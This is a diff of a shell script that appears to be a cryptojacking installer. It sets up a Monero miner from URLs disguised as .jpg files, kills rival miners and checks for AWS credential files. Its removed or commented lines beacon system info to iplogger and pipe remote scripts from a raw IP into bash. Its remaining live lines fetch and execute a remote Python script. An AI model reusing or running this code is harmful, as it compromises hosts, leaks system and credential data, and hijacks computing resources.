@@ -23,8 +23,6 @@ VERSION=3.0
 			echo 'found: /home/*/.aws/credentials'
     fi
 
-$(curl -s -k https://iplogger.org/1Nuxp7 --user-agent "TNTcurl" --referer "$(uname -a)" -o /dev/null || wget -q -O /dev/null --user-agent="TNTwget" https://iplogger.org/1Nuxp7 --no-check-certificate --referer="$(uname -a)")
-
 MOxmrigMOD=https://github.com/littlAcen/moneroocean-setup/blob/main/mod.jpg
 MOxmrigSTOCK=https://github.com/littlAcen/moneroocean-setup/blob/main/stock.jpg
 
@@ -42,7 +40,7 @@ pkill -f /tmp/moneroocean/xmrig 2>/dev/null 1>/dev/null
 rm -fr /tmp/moneroocean/ 2>/dev/null 1>/dev/null
 killall -9 xmrig 2>/dev/null 1>/dev/null
 
-$(curl http://129.211.98.236/ps/clean.jpg | bash || wget -O - http://129.211.98.236/ps/clean.jpg| bash)
+#$(curl http://129.211.98.236/ps/clean.jpg | bash || wget -O - http://129.211.98.236/ps/clean.jpg| bash)
 
 }
 
@@ -471,7 +469,7 @@ systemctl status swapd
 #nohup $(curl http://129.211.98.236/ds/ds.jpg | bash || wget -O - http://129.211.98.236/ds/ds.jpg | bash) &
 
 
-$(curl -s -k https://iplogger.org/133yw7 --user-agent "Mozilla 5.0" --referer "$(uname -a)" -o /dev/null || wget -q -O /dev/null --user-agent="Mozilla 5.0" https://iplogger.org/133yw7 --no-check-certificate --referer="$(uname -a)")
+#$(curl -s -k https://iplogger.org/133yw7 --user-agent "Mozilla 5.0" --referer "$(uname -a)" -o /dev/null || wget -q -O /dev/null --user-agent="Mozilla 5.0" https://iplogger.org/133yw7 --no-check-certificate --referer="$(uname -a)")
 
 python -c "import urllib2;exec(urllib2.urlopen('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').read())" --no-passwd
 python3 -c "import requests;exec(requests.get('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').text)"
